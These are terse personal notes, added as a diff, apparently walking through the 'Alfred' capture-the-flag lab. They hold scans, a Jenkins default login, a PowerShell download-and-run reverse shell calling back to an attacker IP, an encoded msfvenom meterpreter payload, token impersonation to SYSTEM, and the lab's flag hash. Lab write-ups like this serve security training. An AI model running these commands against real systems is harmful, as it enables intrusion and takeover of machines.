@@ -1,0 +1,67 @@
+Alfred
+
+ping 10.10.253.148 - Not ping/ Maybe ICMP req not allowd
+
+nmap -sV 10.10.253.148 -Pn
+nmap -sV -sC -p- 10.10.253.148 -Pn 
+
+Jetty 9.4.z-SNAPSHOT Port= 8080
+
+Default Credencail
+admin:admin
+
+wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1
+
+Exploitation:
+
+python -m http.server 8000
+
+nc -lvnp 4444
+
+powershell iex (New-Object Net.WebClient).DownloadString('http://10.11.9.12:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.11.9.12 -Port 4444
+
+
+
+Goto main page -> click Projet -> click configure -> scroll down -> Bulid option put this script -> back to project -> click Bulid Now.
+
+GOT SHELL.
+
+cd C:\Users\bruce\Desktop
+type user.txt
+
+Switching Shells 
+
+create:
+msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.11.9.12 LPORT=4443 -f exe -o alfred.exe
+
+handler:
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp 
+set LHOST your-ip 
+set LPORT listening-port run
+
+Download it to the machine:
+
+powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.9.12:8000/alfred.exe','alfred.exe')"
+
+Start-Process 'alfred.exe'
+
+Post Exploitation:
+
+meterpreter > shell
+View all the privileges using
+C:// > whoami /priv
+meterpreter > load incognito 
+meterpreter > list_tokens -g
+meterpreter > impersonate_token "BUILTIN\Administrators"
+meterpreter > getuid 
+
+NT AUTHORITY\SYSTEM
+
+
+
+
+
+
+FLAG: 
+User : 79007a09481963edf2e1321abd9ae2a0
